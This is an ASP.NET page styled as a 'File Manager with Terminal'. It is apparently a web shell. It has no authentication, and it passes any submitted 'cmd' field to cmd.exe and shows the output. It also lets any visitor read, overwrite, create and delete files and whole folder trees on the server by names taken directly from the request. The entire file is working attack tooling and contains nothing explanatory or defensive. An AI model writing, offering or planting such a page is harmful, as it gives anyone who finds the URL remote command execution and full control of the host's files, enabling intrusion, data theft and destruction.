<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html>
<html lang="en">
<head runat="server">
    <title>ASP.NET File Manager with Terminal</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet" />
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            color: #0000ff;
            margin: 0;
            padding: 0;
        }
        .container {
            margin-top: 30px;
        }
        .error {
            color: #e74c3c;
            font-weight: bold;
        }
        .success {
            color: #28a745;
            font-weight: bold;
        }
        .file-list {
            background-color: #f4f7fc;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        .file-item {
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            padding: 8px;
            background-color: #e1ecf4;
            border-radius: 5px;
            margin: 5px 0;
        }
        .file-item a {
            color: #007bff;
            text-decoration: none;
            font-size: 16px;
            transition: color 0.3s;
        }
        .file-item a:hover {
            color: #0000ff;
            text-decoration: underline;
        }
        .file-icon {
            margin-right: 10px;
            font-size: 18px;
        }
        .file-folder {
            color: #f39c12;
        }
        .file-file {
            color: #3498db;
        }
        .terminal-output {
            font-family: "Courier New", monospace;
            background-color: #222;
            color: #00FF00;
            height: 300px;
            overflow-y: auto;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        .form-group input, .form-group textarea {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            background-color: #495057;
            color: #f8f9fa;
            border: 1px solid #343a40;
            border-radius: 8px;
        }
        .btn {
            margin-top: 10px;
            padding: 12px 20px;
            border-radius: 8px;
            transition: background-color 0.3s ease;
            font-size: 16px;
        }
        .btn-danger {
            background-color: #e74c3c;
            border-color: #c0392b;
        }
        .btn-info {
            background-color: #17a2b8;
            border-color: #138496;
        }
        .btn-primary {
            background-color: #007bff;
            border-color: #0056b3;
        }
        .btn-success {
            background-color: #28a745;
            border-color: #218838;
        }
        .btn:hover {
            background-color: #555;
        }
        .btn-outline-light {
            color: #ffffff;
            border-color: #555;
        }
        
        /* Modifikasi untuk membuat semua elemen sejajar ke bawah */
        .file-manager-container {
            display: flex;
            flex-direction: column; /* Membuat elemen sejajar secara vertikal */
            gap: 20px;
        }

        .file-manager-container > div {
            background-color: #f4f7fc;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }
        
        .file-manager-container h3 {
            font-size: 20px;
            margin-bottom: 15px;
            color: #0000ff;
        }
        
        .pwd {
            color: #00FF00;
            font-weight: bold;
        }
        .back-button {
            color: #00BFFF;
            font-weight: bold;
        }
        .back-button:hover {
            color: #ffffff;
            text-decoration: underline;
        }
        .back-button-container {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2 class="text-center text-success">ASP.NET File Manager with Terminal</h2>

        <!-- PWD Section (Current Directory) -->
        <div class="back-button-container">
            <a href="<%= Session["PreviousDirectory"] as string ?? Server.MapPath("~/") %>" class="back-button">🔙 Back to previous directory</a>
        </div>

        <div>
            <h3 class="pwd">Current Directory (PWD):</h3>
            <p class="pwd">
                <% 
                    string currentDirectory = Session["CurrentDirectory"] as string ?? Server.MapPath("~/");
                    Response.Write(currentDirectory);
                %>
            </p>
        </div>

        <!-- File Manager and Terminal Section -->
        <div class="file-manager-container">
            <!-- Terminal Section -->
            <div class="terminal-container">
                <h3>Terminal (Shell Command):</h3>
                <form method="POST">
                    <input type="text" name="cmd" placeholder="Enter shell command" class="form-control" autocomplete="off">
                    <input type="submit" value="Execute" class="btn btn-primary mt-2">
                </form>

                <%
                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["cmd"]))
                    {
                        string command = Request.Form["cmd"];
                        string output = "";
                        string error = "";

                        try
                        {
                            string cmdPath = @"C:\Windows\System32\cmd.exe";
                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = cmdPath;
                            psi.Arguments = "/c " + command;
                            psi.RedirectStandardOutput = true;
                            psi.RedirectStandardError = true;
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;

                            Process process = new Process();
                            process.StartInfo = psi;
                            process.Start();

                            output = process.StandardOutput.ReadToEnd();
                            error = process.StandardError.ReadToEnd();

                            process.WaitForExit();

                            if (!string.IsNullOrEmpty(error))
                            {
                                Response.Write("<p class='error'>Error: " + Server.HtmlEncode(error) + "</p>");
                            }
                            else
                            {
                                Response.Write("<p class='success'>Command Executed Successfully:</p>");
                            }

                            Response.Write("<pre class='terminal-output'>" + Server.HtmlEncode(output) + "</pre>");
                        }
                        catch (Exception ex)
                        {
                            Response.Write("<p class='error'>Error executing command: " + ex.Message + "</p>");
                        }
                    }
                %>
            </div>

            <!-- File Management Section -->
            <div class="file-manager">
                <h3>Files and Folders:</h3>
                <div class="file-list">
                    <%
                        string[] directories = Directory.GetDirectories(currentDirectory);
                        string[] files = Directory.GetFiles(currentDirectory);

                        foreach (var dir in directories)
                        {
                            string dirName = Path.GetFileName(dir);
                            Response.Write("<div class='file-item'><i class='fas fa-folder file-icon file-folder'></i><a href='?cd=" + Server.UrlEncode(dirName) + "'> Folder: " + dirName + "</a></div>");
                        }

                        foreach (var file in files)
                        {
                            string fileName = Path.GetFileName(file);
                            Response.Write("<div class='file-item'><i class='fas fa-file file-icon file-file'></i><a href='?readFile=" + Server.UrlEncode(fileName) + "'> File: " + fileName + "</a></div>");
                        }
                    %>
                </div>
            </div>
        </div>

        <!-- File Actions Section -->
        <div class="file-manager-container">
            <!-- Change Directory -->
            <div>
                <h3>Change Directory:</h3>
                <form method="get" class="form-group">
                    <input type="text" name="cd" class="form-control" placeholder="Enter folder name to change to..." size="50">
                    <input type="submit" class="btn btn-info mt-2" value="Change Directory">
                </form>

                <%
                    if (!string.IsNullOrEmpty(Request.QueryString["cd"]))
                    {
                        string folderToChange = Request.QueryString["cd"];
                        string newDirectory = Path.Combine(currentDirectory, folderToChange);

                        if (Directory.Exists(newDirectory))
                        {
                            Session["CurrentDirectory"] = newDirectory; 
                            Session["PreviousDirectory"] = currentDirectory;  // Store previous directory
                            Response.Redirect(Request.Url.AbsolutePath);
                        }
                        else
                        {
                            Response.Write("<p class='error'>Directory not found: " + folderToChange + "</p>");
                        }
                    }
                %>
            </div>

            <!-- Edit File -->
            <div>
                <h3>Edit File:</h3>
                <form method="get" class="form-group">
                    <input type="text" name="editFile" class="form-control" placeholder="Enter file name to edit..." required size="50">
                    <input type="submit" class="btn btn-warning mt-2" value="Edit File">
                </form>

                <%
                    if (!string.IsNullOrEmpty(Request.QueryString["editFile"]))
                    {
                        string fileName = Request.QueryString["editFile"];
                        string filePath = Path.Combine(currentDirectory, fileName);

                        if (File.Exists(filePath))
                        {
                            string fileContent = File.ReadAllText(filePath);
                            Response.Write("<form method='post'><textarea name='editedContent' class='form-control' rows='10'>" + Server.HtmlEncode(fileContent) + "</textarea><br>");
                            Response.Write("<input type='submit' class='btn btn-success' value='Save Changes'></form>");
                        }
                        else
                        {
                            Response.Write("<p class='error'>File not found: " + fileName + "</p>");
                        }
                    }

                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["editedContent"]))
                    {
                        string editedContent = Request.Form["editedContent"];
                        string filePath = Path.Combine(currentDirectory, Request.QueryString["editFile"]);

                        try
                        {
                            File.WriteAllText(filePath, editedContent);
                            Response.Write("<p class='success'>File edited successfully: " + Request.QueryString["editFile"] + "</p>");
                        }
                        catch (Exception ex)
                        {
                            Response.Write("<p class='error'>Error editing file: " + ex.Message + "</p>");
                        }
                    }
                %>
            </div>

            <!-- Create File -->
            <div>
                <h3>Create File:</h3>
                <form method="post">
                    <input type="text" name="fileName" class="form-control" placeholder="Enter file name..." required>
                    <textarea name="fileContent" class="form-control" placeholder="Enter file content..." rows="5" required></textarea><br>
                    <input type="submit" value="Create File" class="btn btn-success">
                </form>

                <%
                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["fileName"]) && !string.IsNullOrEmpty(Request.Form["fileContent"]))
                    {
                        string fileName = Request.Form["fileName"];
                        string fileContent = Request.Form["fileContent"];
                        string filePath = Path.Combine(currentDirectory, fileName);

                        try
                        {
                            File.WriteAllText(filePath, fileContent);
                            Response.Write("<p class='success'>File created successfully: " + fileName + "</p>");
                        }
                        catch (Exception ex)
                        {
                            Response.Write("<p class='error'>Error creating file: " + ex.Message + "</p>");
                        }
                    }
                %>
            </div>

            <!-- Create Folder -->
            <div>
                <h3>Create Folder:</h3>
                <form method="post">
                    <input type="text" name="folderName" class="form-control" placeholder="Enter folder name..." required>
                    <input type="submit" value="Create Folder" class="btn btn-info">
                </form>

                <%
                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["folderName"]))
                    {
                        string folderName = Request.Form["folderName"];
                        string folderPath = Path.Combine(currentDirectory, folderName);

                        try
                        {
                            if (!Directory.Exists(folderPath))
                            {
                                Directory.CreateDirectory(folderPath);
                                Response.Write("<p class='success'>Folder created successfully: " + folderName + "</p>");
                            }
                            else
                            {
                                Response.Write("<p class='error'>Folder already exists: " + folderName + "</p>");
                            }
                        }
                        catch (Exception ex)
                        {
                            Response.Write("<p class='error'>Error creating folder: " + ex.Message + "</p>");
                        }
                    }
                %>
            </div>

            <!-- Delete File -->
            <div>
                <h3>Delete File:</h3>
                <form method="post">
                    <input type="text" name="deleteFile" class="form-control" placeholder="Enter file name to delete..." required>
                    <input type="submit" value="Delete File" class="btn btn-danger">
                </form>

                <%
                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["deleteFile"]))
                    {
                        string deleteFile = Request.Form["deleteFile"];
                        string targetPath = Path.Combine(currentDirectory, deleteFile);

                        if (File.Exists(targetPath))
                        {
                            try
                            {
                                File.Delete(targetPath);
                                Response.Write("<p class='success'>File deleted successfully: " + deleteFile + "</p>");
                            }
                            catch (Exception ex)
                            {
                                Response.Write("<p class='error'>Error deleting file: " + ex.Message + "</p>");
                            }
                        }
                        else
                        {
                            Response.Write("<p class='error'>File not found: " + deleteFile + "</p>");
                        }
                    }
                %>
            </div>

            <!-- Delete Folder -->
            <div>
                <h3>Delete Folder:</h3>
                <form method="post">
                    <input type="text" name="deleteFolder" class="form-control" placeholder="Enter folder name to delete..." required>
                    <input type="submit" value="Delete Folder" class="btn btn-danger">
                </form>

                <%
                    if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["deleteFolder"]))
                    {
                        string deleteFolder = Request.Form["deleteFolder"];
                        string targetPath = Path.Combine(currentDirectory, deleteFolder);

                        if (Directory.Exists(targetPath))
                        {
                            try
                            {
                                Directory.Delete(targetPath, true);  // Delete folder and its contents
                                Response.Write("<p class='success'>Folder deleted successfully: " + deleteFolder + "</p>");
                            }
                            catch (Exception ex)
                            {
                                Response.Write("<p class='error'>Error deleting folder: " + ex.Message + "</p>");
                            }
                        }
                        else
                        {
                            Response.Write("<p class='error'>Folder not found: " + deleteFolder + "</p>");
                        }
                    }
                %>
            </div>

        </div>
    </div>

</body>
</html>
